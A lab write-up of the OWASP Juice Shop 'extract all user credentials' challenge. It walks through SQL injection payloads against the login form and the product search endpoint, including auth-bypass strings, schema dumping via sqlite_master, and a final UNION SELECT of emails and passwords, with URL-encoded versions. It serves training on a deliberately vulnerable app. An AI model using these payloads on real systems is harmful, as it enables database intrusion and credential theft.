---
title: "Juice Shop: SQL Injection — Extract All User Credentials"
tags: [OWASP, JuiceShop, SQLInjection, WebSecurity, BugBounty, CTF, Cybersecurity]
date: 2025-07-10
---

# OWASP Juice Shop: SQL Injection — Extract All User Credentials

## 🧠 Lab Overview

**Challenge**: Retrieve a list of all user credentials via SQL injection.

What made this lab tricky was the misleading assumption that the login form would be the injection point. While it did confirm SQL injection was possible, it **never returned** the user credential list. The actual solution involved switching to the product **search** endpoint — a valuable lesson in backend vs. frontend behavior.

---

## 🔍 Initial Exploration: Login Form

I began by testing SQL injection against the login form:

```json
{"email":"' admin","password":"admin"}
```

Response:

- `SQLITE_ERROR: near "admin": syntax error`
- Revealed backend query format
- Confirmed use of **SQLite**

Tried classic bypass payloads:

```json
{"email":"admin' --","password":"admin"}
{"email":"' OR email = 'admin'-- ","password":"admin"}
```

None yielded access — all returned `Invalid email or password`.

---

## 🧱 UNION SELECT in Login (False Lead)

From here, I tested `UNION SELECT` payloads to identify column count:

```json
{"email": "admin' UNION SELECT NULL,NULL,... (13 columns) -- ", "password": "admin"}
```

✅ This payload did not throw SQL errors. ❌ However, it only returned a `401 Unauthorized` response with a JWT `tmpToken`:

```json
"type": "password_valid_needs_second_factor_token"
```

**Conclusion**: The SQL injection worked — but the frontend was a brick wall. It issued a JWT token, but didn’t render any of the actual data I wanted. In hindsight, Juice Shop gave a crucial hint: the lab objective _“cannot be achieved through the application frontend.”_ I didn’t fully appreciate that until I ran into it firsthand.

That meant I needed to work around the frontend entirely — and find an endpoint that exposed raw backend data. If I could dump the schema, I’d know exactly how to query the user credentials I was after.

---

## 🔁 Key Pivot: Product Search Endpoint

I took a closer look at the `/rest/products/search?q=` endpoint.  I focused through the product search for "apple".  

### Testing Queries:

- `q=apple` → 2 normal results
- `q=apple'` → SQL error
- `q=apple'))--` → ✅ No error (syntax closed)

From there, I escalated:

```http
q=apple')) UNION SELECT 'A','B','C',... (13 strings) --
```

Response: Product card displayed one of the injected values — confirmed output was rendered.  I think I found the vulnerable endpoint.

---

## 🔍 What Went Wrong Initially?

| Symptom                                | Root Cause                                |
| -------------------------------------- | ----------------------------------------- |
| UNION SELECT worked but gave no data   | Frontend ignored backend response         |
| Saw tokens but not email/passwords     | Login API issued 2FA token, not user info |
| 304 Not Modified responses from search | AJAX frontend caching                     |

**Lesson**: The login query executed the SQLi but was never meant to render the result.

---

## 🧠 Schema Enumeration via Injection

Before constructing the final payload, I extracted the full database schema using a targeted injection into the product search endpoint:

```sql
UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
```

Encoded version:

```url
UNION%20SELECT%20sql%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%20FROM%20sqlite_master--
```

This returned the raw SQL used to create various tables — including the `Users` table:

```sql
CREATE TABLE `Users` (
  `id` INTEGER PRIMARY KEY AUTOINCREMENT,
  `username` VARCHAR(255),
  `email` VARCHAR(255) UNIQUE,
  `password` VARCHAR(255),
  `role` VARCHAR(255),
  `deluxeToken` VARCHAR(255),
  `lastLoginIp` VARCHAR(255),
  `profileImage` VARCHAR(255),
  `totpSecret` VARCHAR(255),
  `isActive` TINYINT(1),
  `createdAt` DATETIME,
  `updatedAt` DATETIME,
  `deletedAt` DATETIME
)
```

This confirmed:

- The table had 13 columns
- The first few fields (`email`, `password`) were suitable for display
- I needed to craft a 9-column UNION SELECT to match the `Products` table structure in the search endpoint

### ✅ Final Payload

Using that schema knowledge, I constructed the refined payload:

```sql
UNION SELECT email,password,3,4,5,6,7,8,9 FROM Users--
```

Encoded version:

```url
UNION%20SELECT%20email%2Cpassword%2C3%2C4%2C5%2C6%2C7%2C8%2C9%20FROM%20Users--
```

🟢 This worked — the list of **user credentials** (email + password) was successfully rendered in the product search results.

**Why this worked:**

- The `Products` table uses a 9-column layout.
- Matching that structure in the `UNION SELECT` made the query syntactically valid.
- Using `email` and `password` as the first two columns ensured they appeared in the product cards.

Confirmed and rendered in product search page.

---

## ✅ Takeaways

- **Frontend limitations matter**: Just because a payload runs doesn’t mean results are shown.
- **Favor reflected endpoints**: Search features often echo results — perfect for testing UNION-based SQLi.
- **Dump schema early**: Knowing the table structure accelerates payload building.
- **Validate assumptions**: The login form can mislead you into thinking the injection failed.

---

\#JuiceShop #SQLInjection #OWASP #CTF #Cybersecurity #BugBounty #Infosec

```
